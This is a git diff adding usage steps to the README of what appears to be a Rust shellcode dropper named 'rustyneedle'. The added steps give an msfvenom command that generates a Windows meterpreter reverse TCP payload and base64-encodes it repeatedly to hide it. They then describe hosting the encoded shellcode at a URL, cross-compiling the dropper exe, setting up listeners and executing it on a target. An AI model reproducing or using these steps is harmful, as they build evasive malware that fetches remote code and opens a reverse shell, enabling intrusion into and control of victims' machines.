@@ -20,3 +20,19 @@ python3 encode.py [SHELLCODE_FILE] [B64_ITERATIONS] [OUT_FILE]
 * `B64_ITERATIONS`: # of times to base64-encode the shellcode
 * `OUT_FILE`: Resulting text file of the encoded shellcode. **NOTE:** this will be many times larger than the source!
 
+### Alternative usage
+
+If you don't want to use the script, you can also encode `0x` hex values from `msfvenom`. It would go something like this:
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f csharp | tail -n+2 | sed 's/[{}; \n]//g' | base64 -w 0 > note.txt
+# Pipe to base64 -w 0 as many times as you want to iterate the encoding
+```
+3. Edit the source code in `src/main.rs` to reflect the URL where the encoded shellcode will be hosted.
+
+4. Run `cargo build --target x86_64-pc-windows-gnu --release`. If building on Linux for Windows, make sure you've added the Windows target triple with `rustup target add x86_64-pc-windows-gnu`.
+
+5. Copy the resulting exe in `target/x86_64-pc-windows-gnu/release/rustyneedle.exe` wherever you like.
+
+6. Set up any listeners, then execute the dropper!
+
